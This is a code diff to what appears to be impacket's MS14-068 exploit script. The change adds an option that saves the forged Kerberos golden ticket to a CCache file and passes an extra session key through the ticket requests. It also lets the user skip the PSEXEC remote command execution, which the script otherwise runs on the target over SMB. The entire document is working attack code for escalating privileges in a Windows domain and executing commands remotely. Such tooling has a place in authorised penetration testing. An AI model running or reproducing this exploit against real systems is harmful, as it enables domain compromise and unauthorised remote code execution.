@@ -614,7 +614,7 @@ class MS14_068():
             ('Data', PKERB_VALIDATION_INFO),
         )
 
-    def __init__(self, target, kdchost = None, username = '', password = '', domain='', hashes = None, command='', copyFile=None):
+    def __init__(self, target, kdchost = None, username = '', password = '', domain='', hashes = None, command='', copyFile=None, writeTGT=None):
         self.__username = username
         self.__password = password
         self.__domain = domain
@@ -625,6 +625,7 @@ class MS14_068():
         self.__kdcHost = None
         self.__copyFile = copyFile
         self.__command = command
+        self.__writeTGT = writeTGT
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split(':')
             self.__lmhash = self.__lmhash.decode('hex')
@@ -953,7 +954,7 @@ class MS14_068():
 
         newSessionKey = Key(cipher.enctype, str(encTGSRepPart['key']['keyvalue']))
     
-        return r, cipher, newSessionKey
+        return r, cipher, sessionKey, newSessionKey
 
     def getUserSID(self):
         stringBinding = r'ncacn_np:%s[\pipe\samr]' % self.__domain
@@ -982,7 +983,7 @@ class MS14_068():
         self.__domainSid, self.__rid = self.getUserSID()
 
         userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-        tgt, cipher, sessionKey = getKerberosTGT(userName, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__kdcHost, requestPAC=False)
+        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__kdcHost, requestPAC=False)
         # So, we have the TGT, now extract the new session key and finish
         asRep = decoder.decode(tgt, asn1Spec = AS_REP())[0]
 
@@ -1011,23 +1012,31 @@ class MS14_068():
         authTime = encASRepPart['authtime']
 
         serverName = Principal('krbtgt/%s' % self.__domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-        tgs, cipher, sessionKey = self.getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey, authTime)
+        tgs, cipher, oldSessionKey, sessionKey = self.getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey, authTime)
+
+        if self.__writeTGT is not None:
+            from impacket.krb5.ccache import CCache
+            ccache = CCache()
+            ccache.fromTGS(tgs, oldSessionKey, sessionKey)
+            ccache.saveFile(self.__writeTGT)
 
         # We've done what we wanted, now let's call the regular getKerberosTGS to get a new ticket for cifs
         serverName = Principal('cifs/%s' % self.__target, type=constants.PrincipalNameType.NT_SRV_INST.value)
-        tgs, cipher, sessionKey = getKerberosTGS(serverName, domain, self.__kdcHost, tgs, cipher, sessionKey)
+        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, self.__kdcHost, tgs, cipher, sessionKey)
       
         TGS = {}
         TGS['KDC_REP'] = tgs
         TGS['cipher'] = cipher
+        TGS['oldSessionKey'] = oldSessionKey
         TGS['sessionKey'] = sessionKey
 
         from impacket.smbconnection import SMBConnection
         s = SMBConnection('*SMBSERVER', self.__target)
         s.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, TGS=TGS, useCache=False)
 
-        executer = PSEXEC(self.__command, username, domain, s, TGS, self.__copyFile)
-        executer.run(self.__target)
+        if self.__command != 'None':
+            executer = PSEXEC(self.__command, username, domain, s, TGS, self.__copyFile)
+            executer.run(self.__target)
         #s.connectTree('C$')
         #print s.listPath('C$','/*')
 
@@ -1066,8 +1075,9 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser()
 
     parser.add_argument('target', action='store', help='[domain/][username[:password]@]<address>')
-    parser.add_argument('command', nargs='*', default = ' ', help='command (or arguments if -c is used) to execute at the target (w/o path). Defaults to cmd.exe')
+    parser.add_argument('command', nargs='*', default = ' ', help='command (or arguments if -c is used) to execute at the target (w/o path). Defaults to cmd.exe. \'None\' will not execute PSEXEC (handy if you just want to save the ticket)')
     parser.add_argument('-c', action='store',metavar = "pathname",  help='uploads the filename for later execution, arguments are passed in the command option')
+    parser.add_argument('-w', action='store',metavar = "pathname",  help='writes the golden ticket in CCache format into the <pathname> file')
 
     group = parser.add_argument_group('authentication')
 
@@ -1101,7 +1111,7 @@ if __name__ == '__main__':
     if commands == ' ':
         commands = 'cmd.exe'
 
-    dumper = MS14_068(address, None, username, password, domain, options.hashes, commands, options.c)
+    dumper = MS14_068(address, None, username, password, domain, options.hashes, commands, options.c, options.w)
 
     try:
         dumper.exploit()
